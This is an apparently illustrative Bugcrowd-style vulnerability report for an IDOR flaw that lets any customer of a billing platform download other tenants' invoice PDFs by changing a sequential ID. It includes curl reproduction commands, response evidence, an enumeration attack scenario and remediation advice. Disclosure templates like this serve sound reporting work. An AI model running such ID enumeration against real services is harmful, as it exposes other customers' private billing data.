---
description: "Example: Bugcrowd submission for cross-tenant IDOR on an invoice PDF endpoint"
category: Disclosure & Reporting Formats
---

**Title:** IDOR in invoice PDF endpoint allows customers to read other tenants' invoices

**VRT:** Broken Access Control > Insecure Direct Object Reference (IDOR)

**Severity:** P2 (High) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (6.5)

---

### Summary

A customer of the billing platform reads any other tenant's invoice PDF by changing the numeric ID in the download URL. `GET /api/v2/invoices/{invoice_id}/pdf` checks only that the caller holds a valid session, not that `invoice_id` belongs to the caller's tenant. I found the ID space is sequential across the whole platform, not per-tenant, while diffing two invoice URLs pulled from the same account minutes apart. The PoC below fetches an invoice ID one below the attacker's own range and returns a second tenant's billing data.

### Steps to Reproduce

1. Log in as a normal customer (Tenant A) and open any invoice to capture its ID, e.g. `41207`.
2. Request the tenant's own invoice as a control:
```
curl -s -H "Authorization: Bearer $TENANT_A_TOKEN" \
  https://billing.example.com/api/v2/invoices/41207/pdf -o own-invoice.pdf
```
3. Request an adjacent ID outside the sequence the UI ever shows Tenant A:
```
curl -s -H "Authorization: Bearer $TENANT_A_TOKEN" \
  https://billing.example.com/api/v2/invoices/41198/pdf -o other-invoice.pdf
```
4. `other-invoice.pdf` opens and shows a different company name, billing address, and line items — Tenant A never had access to this account.

### Evidence

```
$ curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TENANT_A_TOKEN" \
    https://billing.example.com/api/v2/invoices/41207/pdf
200                                                              <-- control: own invoice, expected 200

$ curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TENANT_A_TOKEN" \
    https://billing.example.com/api/v2/invoices/41198/pdf
200                                                              <-- exploit: someone else's invoice, still 200

$ pdftotext other-invoice.pdf - | head -5
Northwind Fixtures LLC                                           <-- not Tenant A's company
Invoice #41198  —  Due 2026-06-30
Bill To: accounts@northwindfixtures.example
Line 1: Annual platform license — $18,400.00                    <-- proof of cross-tenant read
Line 2: Overage — API calls (Q2)  — $2,150.00
```

### Attack Scenario

Any paying customer on the platform enumerates the invoice ID space sequentially from their own known IDs. Each hit returns another tenant's invoice PDF with company name, billing contact, and full line-item pricing. A competitor or disgruntled customer scripts the loop once and pulls every other tenant's contract pricing in one pass.

### Impact

Any authenticated tenant reads billing data, contact details, and negotiated pricing for every other tenant on the platform. The ID space is sequential and unsalted, so the exposure isn't limited to adjacent accounts — it covers the full customer base in one enumerable range.

### Remediation

Scope the invoice lookup by tenant ID in the query — add a `WHERE tenant_id = :caller_tenant_id` check (or equivalent ownership check in the invoice service) before the PDF is generated, not after. Switch the invoice identifier in the URL to a per-tenant opaque token or UUID as defense-in-depth so an ownership-check regression doesn't reopen an enumerable ID space.
